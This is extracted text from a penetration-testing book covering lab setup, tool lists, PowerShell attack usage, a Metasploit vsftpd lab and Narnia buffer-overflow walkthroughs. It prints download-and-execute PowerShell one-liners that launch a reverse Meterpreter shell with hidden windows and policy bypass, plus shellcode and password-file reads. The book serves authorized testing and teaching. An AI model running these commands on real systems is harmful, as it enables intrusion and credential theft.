For those that read the first book, this is an extension of that book. Below is an overview of all of the new vulnerabilities and attacks that will be discussed. In addition to the new content, attacks and techniques from the first book, which are still relevant today, are included to eliminate the need to refer back to the first book. So, what’s new? Some of the updated attacks from the last year and a half include: ● Heartbleed ● ShellShock ● Kerberos issues (Golden Ticket/Skeleton Key) ● PTH Postgres ● New Spear Phishing ● Better/Cheaper Dropboxes ● Faster/Smarter Password Cracking ● New WIFI attacks ● Tons of PowerShell scripts ● Privilege Escalation Attacks ● Mass network compromises ● Moving laterally smarter ● Burp Modules ● Printer Exploits ● Backdoor Factory ● ZAP Proxy ● Sticky Keys ● NoSQL Injection ● Commercial Tools (Cobalt Strike, Canvas, Core Impact) ● Lab sections ● And so much more In addition to describing the attacks that have changed in the last couple years, I have attempted to incorporate all of the comments and recommendations received from readers of the first book into this second book. A more in-depth look into how to set up a lab environment in which to test your attacks is also given, along with the newest tips and tricks of penetration testing. Lastly, I tried to make this version easier to follow since many schools have incorporated my book into their curricula. Whenever possible, I have added lab sections that help provide a way to test a vulnerability or exploit. What’s not different? One of my goals from the first book was to make this as “real world” as possible. I really tried to stay away from theoretical attacks and focused on what I have seen from personal experience and what actually worked. The second goal was to strengthen your core"},{"pageNumber":13,"pageContent":"understanding as a penetration tester. In other words, I wanted to encourage you to use different methods to boost your value to your current or future company or client. Just running a vulnerability scanner and submitting that as your report provides no real benefit to a company. Also, penetration tests with an extremely limited scope will give a false sense of security. To THP1 readers, rest assured that although you may find some familiar information, there is a great deal of new information in THP2, which has double the content compared to its predecessor. Additionally, by popular demand, I have created a slew of scripts and tools to help you in your hacking adventure. This was probably one of the top requests by readers, so I have included a ton of scripts located in my Github ( https://github.com/cheetz ) and tried to make it easier to follow. For those who did not read the first book, you might be wondering what experience I have as a penetration tester. My background comes from eight years of penetration testing for major financial institutions, large utility companies, Fortune 500 entertainment companies, and government organizations. I have also spent years teaching offensive network security, spoken at Toorcon/Derbycon/BayThreat, been referenced in many security publications, and currently run a security community of over 300 members in Southern California. My hope is that you will be able to take what I have learned and incorporate it into your own security lifestyle. From a technical standpoint, many tools and attacks have changed in the past couple years. With attacks like pass-the-hash, and with Group Policy Preferences getting patched, the process and methods of attackers have changed. One important note is that I am using both commercial tools and open source. For every commercial tool, I try to give an open source counterpart. I occasionally run into some pentesters that say they only use open source tools. As a penetration tester, I find this a hard statement to take. If you are supposed to emulate a “real world” attack, the “bad guys” do not have these restrictions, then you need to use any tool that works to get the job done. Who is this book intended for? You need to have some experience with Microsoft Active Directory, a solid understanding of Linux, some networking background, some coding experience (Bash, Python, Perl, Ruby, PHP, C, or anything along that line), and using security tools like vulnerability scanners and exploit tools (i.e. Metasploit). If you don’t have the background, but are interested in getting into security, I would suggest making sure you have the basics down. You can’t just jump into security without the basic knowledge of how things work first. This book is not just for those looking to get into or who currently are in the offensive fields. This book provides valuable information and insight for incident responders as well, as they need to know how attackers think and what methods they use. Lastly, I want to discuss a bit about the difference between researchers and penetration testers. Many times, these two professions blend together, as both need to be knowledgeable in both areas. However, in this book, I separate the two areas slightly and focus on penetration testing. To clarify, in"},{"pageNumber":14,"pageContent":"this book, a researcher is one who focuses on a single or limited scope and spends more time reversing the application/protocol/OS. Their goal is to discover an unknown exploit for that particular vulnerability. On the other hand (and remember this is a generalization), a penetration tester takes what is already known to compromise systems and applications. There will always be some overlap–a pentester will still fuzz vulnerabilities (for example, web parameters) and find zero- days–but he/she might not spend as much time finding all the issues as a researcher might. Last Notes and Disclaimer This book is not going to turn you into some sort of super hacker. It takes a lot of practice, research, and a love for the game. This book will hopefully make you think outside the box, become more creative, and help grow your understanding of flaws that occur in systems. Just remember, ONLY test systems on which you have written permission. Just Google the term “hacker jailed” and you will see plenty of different examples where young teens have been sentenced to years in prison for what they thought was a “fun time.” There are many free platforms where legal hacking is allowed and will help you further educate yourself. "},{"pageNumber":15,"pageContent":"Introduction You have been hired as a penetration tester for a large industrial company called Secure Universal Cyber Kittens, Inc. or SUCK, for short. They are developing future weapons to be used by the highest bidder and you have been given the license to kill...okay, maybe not kill, but the license to hack. This authorization gives you full approval to use any tactic in your arsenal to try to break into and steal the company’s trade secrets. As you pack your laptop, drop boxes, rubber duckies, Proxmarks, and cables, you almost forget the most important thing...The Hacker Playbook 2 (THP). You know that THP will help get you out of some of the stickiest situations. Your mind begins hazing back to your last engagement... After cloning some badges and deploying your drop box on the network, you run out of the office, barely sneaking past the security guards. Your drop box connects back to your SSH server and now you are on their network. You want to stay pretty quiet on the network and not trigger any IDS signatures. What do you look for? You flip to the Before the Snap chapter and remember printers! You probe around for a multifunction printer and see that it is configured with default passwords. Great! You re-configure LDAP on the printer, set up your netcat listener, and obtain Active Directory credentials. Since you don’t know what permissions these credentials have, you try to psexec to a Windows machine with a custom SMBexec payload. The credentials work and you are now a regular user. After a couple tricks with PowerTools in the Lateral Pass section, you move to local admin and pull passwords from memory with Mimikatz. Phew... you sigh... this is too easy. After pulling passwords for a few accounts, you find where the domain admins (DA) are and connect to their boxes to pull passwords again. With domain admin creds, it is pretty straightforward to dump the Domain controller (DC) with psexec_ntdsgrab and then clear your tracks... Glad you didn’t forget your copy of THP! Standards Before we can dive into THP, we need to understand some of the basics and standards used for penetration testing. This will be the foundation for recon, finding and exploiting vulnerabilities, and reporting. There really is no right way to perform an engagement, but you will need to at least cover the basics. The Penetration Testing Execution Standard (PTES - http://www.pentest-standard.org/index.php ): PTES is the current standard for performing penetration tests. These are referenced regularly and are the core elements in what goes on in an engagement. I highly recommend that you go through the entire"},{"pageNumber":16,"pageContent":"PTES technical guideline as it is full of detailed information. The standard accepted model consists of seven main sections: 1 . Pre-engagement Interactions 2 . Intelligence Gathering 3 . Threat Modeling 4 . Vulnerability Analysis 5 . Exploitation 6 . Post Exploitation 7 . Reporting One thing I encourage you to do is to be creative and find what works for you. For me, although the PTES framework is a great model for performing penetration tests, I like taking penetration tests and tweaking the standard model. From experience, the standard I would typically use would look something like the following: 1 . Intelligence Gathering 2 . Initial Foothold 3 . Local/Network Enumeration 4 . Local Privilege Escalation 5 . Persistence 6 . Lateral Movement 7 . Domain Privilege Escalation 8 . Dumping Hashes 9 . Data Identification/Exfiltration 10 . Reporting This breakdown shows what I would perform and focus on during a penetration test. After the initial foothold via social engineering, the focus is to acquire a privileged account. To get there, you have to enumerate the system/network and look for misconfigurations or local vulnerabilities. We also need to implement persistence, just in case we end up losing our shells. Once at a system or elevated account, we need to see if we can acquire a domain-privileged account. To do this, we need to compromise other boxes to eventually get to a domain admin (DA) account. At a domain controller (DC), the best part of the test is to dump the domain hashes and take a quick break for a happy dance. This test should not end here. Where customer value really comes into play is going after sensitive data, especially personally identified information (PII), intellectual property (IP), or other information requested by the client. Lastly, since we all know that reporting pays the bills, having a good standard template and valuable data will set you apart from the competition. Of course, this was all a very quick and high-level example of what can occur during an assessment. To guide you through this process, I have tried to develop a format to help you on your path. The Hacker Playbook is setup with 11 different sections, laid out as a football playbook. But, do not worry, you don’t necessarily need to know the football terms in detail to follow along. Here is the breakdown:"},{"pageNumber":17,"pageContent":" ● Pregame: This is all about how to set up your lab, attacking machines, and the tools we will use throughout the book. ● Before the Snap: Before you can run any plays, you need to scan your environment and understand what you are up against. We will dive into discovery and smart scanning. ● The Drive: Take the vulnerabilities which were identified from Before the Snap and start exploiting those systems. This is where we get our hands a little dirty and start exploiting boxes. ● The Throw: Sometimes you need to get creative and look for the open target. We will take a look at how to find and exploit manual web application findings. ● The Lateral Pass: After you have compromised a system, we will discuss ways to move laterally through the network. ● The Screen: A play typically used to trick the enemy. This chapter will explain social engineering tactics. ● The Onside Kick: A deliberately short kick that requires close distance. Here, I will describe attacks that require physical access. ● The Quarterback Sneak: When you only need a couple of yards, a quarterback sneak is perfect. Sometimes you will get stuck with antivirus (AV); this chapter describes how to get over those small hurdles by evading AV. ● Special Teams: Cracking passwords, exploits, NetHunter and some tricks. ● Two-Minute Drill: You have only two minutes on the clock and you need to go from no access to full domain admin. ● Post-Game Analysis: Reporting your findings. Updates As we all know, security changes quickly and things break all the time. I try to keep up with all of the changes and any requests you might have.

(SUCK), we need to build our testing lab to test our attacks, develop our attacking machines, and understand how our exploits work. Practice and testing are invaluable when it comes to running a full scale attack. You don’t want to be the average Joe on a test using untested exploits which inadvertently takes down a critical system, getting you identified and tossed out of the company. Building A Lab It might be hard to build a full lab with all the applications, operating systems, and network appliances, but you need to make sure you have the core components. These include basic Linux servers and Windows systems. Since Microsoft Windows operating systems aren’t free, you may have to purchase some software. If you are a student, you can generally get free software through your school. You can also check Microsoft DreamSpark (https://www.dreamspark.com/) to see if you qualify. I think with a default .edu email address you can get Windows 2012 and other software for free. Building Out A Domain Practicing on a Microsoft Active Directory (AD) environment is good; however, one of the best ways to learn is to build one yourself. Knowing how and why things work on an AD environment will help you later on in life. I have put together condensed step-by-step instructions on how to set up an AD domain controller that should get you up and running. For those who have never built a DC and client before, I highly recommend you do this first. Before you can really understand what you are attacking, you need to understand how it works. In the example provided below, I will install a Windows Domain Environment using Windows 2012 R12, Windows 8 and Windows 7. In this book, I wanted to focus on the newer operating systems. However, if you are looking to test older exploits, you may want to consider installing Windows XP SP2. Check out my Active Directory installation guide here: http://www.thehackerplaybook.com/Windows_Domain.htm Building Out Additional Servers Below are the vulnerable virtual machines I recommend. Many of the labs in this book will use these two frameworks for testing. For your"},{"pageNumber":19,"pageContent":"own practice, you should look at the other test servers mentioned at the end of this book. Metasploitable2 This is a great vulnerable Ubuntu Linux virtual machine that intentionally contains common vulnerabilities. This is great for testing security tools, such as Metasploit, and demonstrating common attacks. It is relatively easy to set up as you just need to download the virtual machine (VM) and boot it in a Virtual Platform. ● http://sourceforge.net/projects/metasploitable/files/Metasploitable2 OWASPBWA (OWASP Broken Web Applications Project) While Metasploitable2 focuses on services, OWASPBWA is a great collection of vulnerable web applications. This is one of the most complete vulnerable web application collections in a single VM. This VM will be used for many of the web examples throughout the book. As with Metasploitable2, just download the vulnerable VM and boot it up. ● http://sourceforge.net/projects/owaspbwa/files/ Practice Penetration testing is like any other profession and needs to be second nature. Every test is completely different and you need to be able to adapt with the changing environment. Without adequate practice, trying multiple different tools, and exploiting systems using different payloads, you won’t be able to adapt if you ever run into a brick wall. Building Your Penetration Testing Box In The Hacker Playbook One book, I received some comments on why I have you build and install the tools instead of creating one script to automate it all. The main reason I have my readers manually go through these steps is because these are extremely important tools and this will help you remember what is available in your own arsenal. Kali Linux, for example, has tons of tools and is well- organized, but if you don’t know the tool is installed or you haven’t played around with the individual attacks, then it won’t really be helpful in that dire need situation."},{"pageNumber":20,"pageContent":" Setting Up A Penetration Testing Box If you set up your box from the first book, you can breeze over this section. As you know, I always like bringing two different laptops to an engagement. The first is a Windows box and the second is either an OS X or Linux host. The reason I bring two laptops is because I have been on penetration tests where, on very specific networks, the OS X host would not connect to the network. Instead of spending hours trying to figure out why, I just started all of my attacks and scanning from my Windows host and fixed the OS X issue during any free time. I cannot tell you the countless times having two laptops has saved me. It doesn’t matter if you run Windows, OS X, or some Linux flavor on your base system, but there are a few musts. First, you need to install a Virtual Machine (VM) platform. You can use Virtual Box ( https://www.virtualbox.org ) or VMWare Player ( https://my.vmware.com/web/vmware/downloads ) or any others of your choice. Both are free on Windows and only Virtual Box on OS X is free. I would highly recommend getting the commercial versions for your VM platform as they have a wealth of extra features, such as encryption, snapshots, and much better VM management. Since we are going to install most of our tools on our VMs, the most important step is to keep your base system clean. Try not to even browse personal sites on the base image. This way, your base system is always clean and you won’t ever bring malware onto a client site (I have seen this many times before), or have unknown vulnerable services listening. After configuring my hosts, I snapshot the virtual machine at the clean and configured state. This way, for any future tests, all I need to do is revert back to the baseline image, patch and update tools, and add any additional tools I need. Trust me, this tactic is a lifesaver. I can't count the number of past assessments where I spent way too much time setting up a tool that should have already been installed. Hardware Penetration Testing Laptop For your basic penetration laptop requirements, they haven’t changed much from the previous book. Basic recommendations: ● Laptop with at least 8GB of RAM ● 500GB hard drive (solid state is highly recommended) ● Intel Quad Core i7 Processor Password Cracking Desktop This is completely optional, but with the number of tests where I have compromised hashes, faster password cracking equipment was required. Although, you could purchase some crazy rig with 8"},{"pageNumber":21,"pageContent":"GPUs that runs on a Celeron processor, I have built a multi-purpose box with plenty of space and amazing password cracking power. Later in the book, I will go over the actual specs and tools I built out for password cracking and the reasons why I went this route. Password Cracking/Multi-purpose Hacking Box ● Case: CORSAIR Vengeance C70 ● Video Card: SAPPHIRE 100360SR Radeon R9 295x2 8GB GDDR5 ● Hard Drive: SAMSUNG 840 EVO MZ-7TE500BW 2.5\" 500GB SATA III TLC Internal SSD ● Power Supply: SILVERSTONE ST1500 1500W ATX ● RAM: CORSAIR Vengeance Pro 16GB (2 x 8GB) 240-Pin DDR3 SDRAM DDR3 1600 ● CPU: CORE I7 4790K 4.0G ● Motherboard: ASUS MAXIMUS VII FORMULA ● CPU Cooler: Cooler Master Hyper 212 EV This is definitely overkill for just password cracking, since the only thing that really matters are the GPUs; but, again, I still wanted to use this as an additional system in my arsenal. Open Source Versus Commercial Software In this book, I thought it would be beneficial to include a comparison of open source and commercial software. Although not everyone has the funds to purchase commercial software, it is very important to know what is available and what an attacker might use. Both as a defender and someone who runs offensive plays, having the right tools can definitely make the difference. In this book, I will show you several different commercial software tools that I find very useful, which can assist in various types of offensive situations. With every commercial software, I will try to provide an open source companion, but it may not always be available. Commercial Software in The Hacker Playbook 2 ● Burp Suite Pro ● Canvas ● Cobalt Strike ● Core Impact ● Nessus ● Nexpose Kali Linux ( https://www.kali.org/ ) For those who have never used Kali Linux, it is often seen as the standard in offensive penetration"},{"pageNumber":22,"pageContent":"testing. This Debian-based Linux distro contains a wealth of different security tools all preconfigured into a single framework. This is a great starting point for your offensive security platform and the book mainly builds off of this Linux distribution. I highly recommend that you download the virtual machine and use this for your testing. Back Box ( http://www.backbox.org/ ) Although Kali Linux is seen as the standard, it is best to not ever rely on a single tool/OS/process— this will be a constant theme throughout the book. The developers could stop supporting a certain tool or, even worse, you begin to experience tunnel vision and rely on old methods. The guys over at Back Box are doing great work building and supporting another security platform. The main differences I can see is that Back Box is based on Ubuntu and more importantly, comes with default user rights management (instead of everyone running as root in Kali Linux). Some people are more comfortable with Ubuntu and I have gotten into situations where specific tools are developed for and run more stable on Ubuntu versus Kali. Again, it should be just another tool available at your reach and it is good to know what is out there. Setting Up Your Boxes There are many tools that are not included or that need to be modified from the stock tool set in any of the security distributions (distro). I like to put them in a directory where I know where they exist and can be used easily. Here are the tools that you will need to install. Recon/Scanning Tools ● Discover ● EyeWitness ● HTTPScreenShot ● WMAP ● SpiderFoot ● Masscan ● Gitrob ● CMSmap ● Recon-ng ● SPARTA ● WPScan ● Password Lists Exploitation ● Burp Suite Pro ● ZAP Proxy Pro ● NoSQLMap ● SQLMap"},{"pageNumber":23,"pageContent":"● SQLNinja ● BeEF Exploitation Framework ● Responder ● Printer Exploits ● Veil ● WIFIPhisher ● Wifite ● SET Post Exploitation ● Hacker Playbook 2 - Custom Scripts ● SMBexec ● Veil ● WCE ● Mimikatz ● PowerSploit ● Nishang ● The Backdoor Factory ● DSHashes ● Net-Creds Setting Up Kali Linux There are many different ways you can set up your attacker host, but I want you to be able to mimic all of the examples in this book. Before going on, you should try to configure your host with the settings below. Remember that tools do periodically change and that you might need to make small tweaks to these settings or configurations. (Don’t forget to check the updates page at http://www.thehackerplaybook.com ). For those users that have only purchased the physical book, I have copied the whole settings and software section to my Github ( http://www.github.com/cheetz/thp2 ). This should make copying and pasting much easier, so you don’t have to type each command in by hand. Since this book is based off of the Kali Linux platform, you can download the Kali Linux distro from: http://www.kali.org/downloads/ . I highly recommend you download the VMware image ( https://www.offensive-security.com/kali-linux-vmware-arm-image-download/ ) and download Virtual Player/VirtualBox. Remember that it will be a gz-compressed and tar archived file, so make sure to extract them first and load the vmx file.

If you don’t have any experience with PowerShell, I would highly recommend you take some time and write some basic PowerShell scripts. If you need something to help get you in the PowerShell game, take a look at this video: ● Intro to PowerShell Scripting for Security: http://bit.ly/1MCb7EJ The video is kind of long, but will get you some of the basics you need to get your PowerShelling off the ground. Why do I focus so much on PowerShell in this book? The benefits of PowerShell for a penetration tester: ● Installed by default on Windows 7+ machines ● PowerShell scripts can run in memory ● Almost never triggers antivirus ● Utilizes .NET Framework classes ● Takes advantage of credentials of the user (for querying Active Directory) ● Can be used to manage Active Directory ● Remotely executes PowerShell scripts ● Makes scripting Windows attacks much easier ● Many tools are now being built in PowerShell and understanding it will make you a more powerful and efficient penetration tester You can always drop into a PowerShell command from a Windows terminal prompt by typing “powershell” and get to the help menu by typing “help” once inside PowerShell. Here are the basic flags and settings used throughout the book: ● -Exec Bypass: Bypass Security Execution Protection ○ This one is extremely important! By default, PowerShell has an execution policy to not run PowerShell command/files. By running this command you bypass any of those settings. Throughout the book we will use this flag almost every time. ● -NonI: Noninteractive Mode - PowerShell does not present an interactive prompt to the user ● -NoProfile (or -NoP): Enforces PowerShell console not to load the current user's profile ● -noexit: Do not exit shell after execution. This is important for scripts like keyloggers, so that they continually run. ● -W Hidden: Sets the window style for the session. This is so that the command prompt stays hidden. ● 32-bit or 64-bit PowerShell: ○ This is also very important. Some scripts are only meant to run on their specified platform. So if you are on a 64bit box, you might need to execute 64-bit PowerShell to run the command."},{"pageNumber":33,"pageContent":"○ 32-bit PowerShell Execution: powershell.exe -NoP -NonI -W Hidden -Exec Bypass ○ 64-bit PowerShell Execution: %WinDir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe - NoP -NonI -W Hidden -Exec Bypass To help you better understand what we will come across in the PowerShell adventures, here are some of the common execution commands that will be used throughout this book: The first command will download a PowerShell script from a web server and execute that script. In many cases, we are going to download a Meterpreter PowerShell script on a victim target via a command prompt: ● Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('[PowerShell URL]'); [Parameters] For example, if we want to execute a Meterpreter Shell on a target, we need to download this script: ● https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke- -Shellcode.ps1 We also need to know which parameters to use. The easiest way to find out what parameters you might need is to read the source code of the PowerShell Script. Go visit the Invoke--Shellcode.ps1 file. If we look at the Invoke--Shellcode.ps1 file written by Mattifestation, we can see an example of how to call a reverse-https Meterpreter shell. Invoke--Shellcode.ps1 Our final PowerShell command will look like this: ● Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke- -Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https - Lhost 192.168.30.129 -Lport 80 "},{"pageNumber":34,"pageContent":"This makes PowerShell extremely easy and powerful to use. Let’s look at a few more examples. Let’s say you downloaded the same file onto the target. You don’t want to have to reach out to a web page to automatically download and execute the file. To locally run it: ● powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"& {Import- Module [Path and File of PowerShell Script]; [Parameters]}\" Lastly, throughout this book, I will regularly use base64 encoded PowerShell scripts both for obfuscation and for compacting my code. To run an encoded PowerShell Script: ● powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc [Base64 Code] Hopefully, this makes using PowerShell pretty straightforward and usable in your own tests. Easy-P Because this book is so heavily invested in PowerShell attacks, I created a little script to make PowerShell a little more accessible during a penetration test. Easy-P has some of the common PowerShell tools I use and the ability to encode my scripts. For every command, Easy-P will give you multiple ways to run the code both locally and remotely. Note that all the remote PowerShell scripts are linked to either my code or to forked versions of other people’s codes. I want to mention something here, which will be mentioned a couple more times throughout the book: Remember to fork your own copies off of the original sources, so that you don’t blindly run someone else’s code. You never know if someone is going to maliciously change the PowerShell script randomly and now, either nothing works or even worse, your shells are going somewhere else. Let’s dive into Easy-P to make your life much simpler. ● cd /opt/Easy-P ● python ./easy-p.py "},{"pageNumber":35,"pageContent":"THP Easy-P One of the most common things I will do in this book is use PowerShell Meterpreter Scripts. Once you execute the Easy-P script, select option 4. You will be presented with setting your localhost IP and the port on which you want the Meterpreter script to connect back. Once that is done, you will have an output similar to the following: "},{"pageNumber":36,"pageContent":"Example Easy-P Output You will get four different outputs: ● Download from the Internet and execute: Download a PowerShell script from a website then execute that script. This is great when you only have a simple shell and do not have the ability to download files. ● Run from a local copy of the script: If you have already pushed a PowerShell file to the system, it will output a command to import that PowerShell script and execute it. ● Base64 encoded version of download and execute: If for some reason you want to obfuscate your encoded scripts or you run into character limitations, this will base64 your code and give you the execution command. ● Resource File: Lastly, you will be given the associated Resource File. A Metasploit resource file is a quick way to automatically set up a handler for the Meterpreter PowerShell script. Copy that resource script and save it to a file: /opt/listener.rc."},{"pageNumber":37,"pageContent":" All of the scripts are already configured to bypass execution policy, stay hidden, and run non- interactive. Take a look at all of the other menu choices in Easy-P, as it also has modules on Privilege Escalation, Lateral Movement, Keylogging, PowerShell Meterpreter, and Change Users Execution Policy. Feel free to fork my code and modify it to add all the PowerShell code you need. Learning This book is really geared toward those who have, at a minimum, some understanding of tools like Nmap, Metasploit, Cain and Abel, aircrack and others. You should also have a high level of understanding of attacks like buffer overflows and high-level languages like Python/Ruby. If you need a quick refresher or need to do some testing, here is a little starter pack for you: Metasploitable 2 One comment I received was that there were no beginner walk-throughs on how to use Metasploit or fully test exploits using some of Metasploit’s features. This is where Metasploit 2 comes in as a great test bed. Before we get started, we need to download the VMWare Image for Metasploitable 2. Download: http://sourceforge.net/projects/metasploitable/files/Metasploitable2/ Once you download Metasploitable 2, unzip it, and open it in VMware Player or Virtual Box, login with the user account msfadmin and password msfadmin . Now, you have your vulnerable VM image running. LAB Practice running Nmap, Masscan, or vulnerability tools against the vulnerable virtual machine. Once you find the system vulnerable to an exploit, let’s get a shell on it. In our example, we found and are going to take advantage of a flaw in vsftpd. So we can either do a search for the exploit (search vsftpd) or we can go straight into the exploit. ● msfconsole ● use exploit/unix/ftp/vsftpd_234_backdoor (selects the exploit) ● show options (shows all the configuration options) ● set RHOST [IP] (sets the Metasploitable 2 IP) ● exploit (runs the exploit) "},{"pageNumber":38,"pageContent":"Metasploit Example We were successfully able to exploit this vulnerability and read the stored passwords with: cat /etc/shadow. To further dig into Metasploitable 2, check out the Rapid7 guide: https://community.rapid7.com/docs/DOC-1875 . There are a ton of different vulnerabilities on this virtual machine. Make sure you spend time learning how to effectively use Metasploit and Meterpreter. If you are looking to get deeper into Metasploit, I recommend: http://www.amazon.com/Metasploit-The-Penetration-Testers-Guide/dp/159327288X . Binary Exploitation Just like in the first edition of The Hacker Playbook , this book does not go deeply into binary exploitation, because this is a whole other topic that requires something like The Shellcoders Handbook ( http://amzn.to/1E3k89R ) or Hacking: The Art of Exploitation, 2nd Edition ( http://amzn.to/1z8oThD ). However, this doesn’t mean that you shouldn’t have an understanding of buffer overflows and basic exploitation. Since all penetration testers should be able to “script” code, they should also be able to read other exploitation code. You might find a module in Metasploit that does not work and needs minor modifications or verification of what it does before you download an exploit from the Internet."},{"pageNumber":39,"pageContent":" There are a ton of different sites you can start with to get the basics down on binary exploitation. A great place to learn is on a site called Over the Wire ( http://overthewire.org/wargames/narnia/ ). Over the Wire is an online CTF-style challenge that focuses on all aspects of hacking from binary to web. In this chapter, we are only going focus on binary exploitation. If you have never done anything like this before, I would take a couple of weekends to hammer away at this site. To get you started, I will walk you through the first couple of challenges—however, it is up to you to continue down the path. Before you begin, study up a bit on: ● Basic assembly and understanding registers ● The basics on GDB (GNU Debugger) ● Understand the different memory segments (the stack, heap, data, BSS, and code segments) ● Shellcode basics Some resources that might help you start: ● http://opensecuritytraining.info/IntroX86.html ● http://www.reddit.com/r/hacking/comments/1wy610/exploit_tutorial_buffer_overflow/ ● https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1- stack-based-overflows/ ● http://www.lethalsecurity.com/wiki ● http://opensecuritytraining.info/Exploits1.html ● https://exploit-exercises.com/protostar/ Narnia Setup ( http://overthewire.org/wargames/narnia/ ) Stage 1 Narnia is configured so that you SSH into their servers and all challenges are located under /narnia/. Let’s walk through the first three examples. From a terminal prompt on Kali or using something like Putty ( http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html ) on Windows: ● ssh narnia0@narnia.labs.overthewire.org ● Password: narnia0 ● cd /narnia/ Each challenge is laid out in a manner that shows you both the C code and the binary executable. For challenge 0, we have both a narnia0 and narnia0.c file. Let’s take a look at the raw C code: ● cat narnia0.c "},{"pageNumber":40,"pageContent":"Narnia 0 - Code After taking a quick look at the code, we see the variable “val” is assigned to the hex value of “AAAA”. Next, we see that it takes an input with buffer length of 20 bytes. A few lines later, we see that scanf() expects 24 bytes maximum. This is your very simple buffer overflow type example. Now, let’s run the executable, and, as a test, supply it 20 A’s and 4 B’s (because we know the hex value of A = 41 and B = 42). So at the command prompt, it should look something like this: ● narnia0@melinda:/narnia$ ./narnia0 ● Correct val's value from 0x41414141 -> 0xdeadbeef! ● Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB ● buf: AAAAAAAAAAAAAAAAAAAABBBB ● val: 0x42424242 ● WAY OFF!!!! Great! Since the HEX value at “val” is 0x42424242 (42 translates to ASCII letter B), we know that we are able to overwrite the value of “val” in memory, which was previously 0x41414141. All we have to do now is overwrite this value in memory with 0xdeadbeef. The thing to remember is that everything must be written to the stack in Little Endian format (http://en.wikipedia.org/wiki/Endianness), meaning the last byte in 0xdeadbeef must be the first byte pushed to the stack to overwrite the value of “val”. This is due to the First-In, Last-Out (FILO), or Last-In, First-Out (LIFO) architecture of the target machine’s stack. So, to supply our 0xdeadbeef value, we will have to write it as “\\xef\\xbe\\xad\\xde”. The easiest way to only supply HEX values and"},{"pageNumber":41,"pageContent":"execute our A’s is using python and piping it into our narnia0 example. Let’s see this in action: ● narnia0@melinda:/narnia$ python -c 'print \"A\"*20 + \"\\xef\\xbe\\xad\\xde\"' | ./narnia0 ● Correct val's value from 0x41414141 -> 0xdeadbeef! ● Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA\u0000? ● val: 0xdeadbeef Great x2! We now have written deadbeef in our “val” variable. How can we run shell commands? If we go back to our C code, we see that if we match deadbeef, /bin/sh gets called. So let’s take our python code and try to read the key located at /etc/narnia_pass/narnia1: ● narnia0@melinda:/narnia$ (python -c 'print \"A\"*20 + \"\\xef\\xbe\\xad\\xde\"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0 ● Correct “val's” value from 0x41414141 -> 0xdeadbeef! ● Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA\u0000? ● val: 0xdeadbeef ● [Answer to Stage 1] Narnia 0 – Exploit If you were successful, you have defeated stage 1 and earned the password to the narnia1 account. We need to log out and log into the newly gathered account. Stage 2 After you finish each stage, you get the password to the next account. Let’s log into stage 2 using the narnia1 account we just obtained.

The easy way to do this is to take the shellcode for /bin/sh and set it to an environment variable EGG. ● We will use the shellcode for /bin/sh from this example: http://shell-storm.org/shellcode/files/shellcode-811.php ● export EGG=`python -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"'` ● ./narnia1 ● cat /etc/narnia_pass/narnia2 Narnia 1 - Exploit We now have the password to the narnia2 account and can move on to stage 3.

We see that there is a char buf of 128 bytes, so let’s start by sending 200 characters: ● narnia2@melinda:/narnia$ ./narnia2 `python -c 'print \"A\" * 200'` ● Segmentation fault We just verified that sending 200 characters causes the application to have a segmentation fault. We need to identify how many bytes before we overwrite EIP. We can do this with a Metasploit module called pattern_create.rb. This module creates a unique string and in our example below, we will create a string of 200 bytes. Since this string never repeats, we can identify exactly where our program overflows EIP. ● /usr/share/metasploit-framework/tools/pattern_create.rb 200 ● Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Now, let’s run our new custom unique string through narnia2 to see how many bytes it takes before we cause a segmentation fault. To see the exact results of our segmentation fault, we will have to use a debugger. By default, Linux systems have a debugger called gdb. Although it isn’t the easiest debugger to use, it is extremely powerful: ● gdb ./narnia2 -q ● run `python -c 'print \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\"'` The result of the query is: "},{"pageNumber":44,"pageContent":"Narnia 2 – Exploit ● Program received signal SIGSEGV, Segmentation fault. ● 0x37654136 in ?? () The output from our command is 0x37634136. We need to look in our original string to find that exact value.

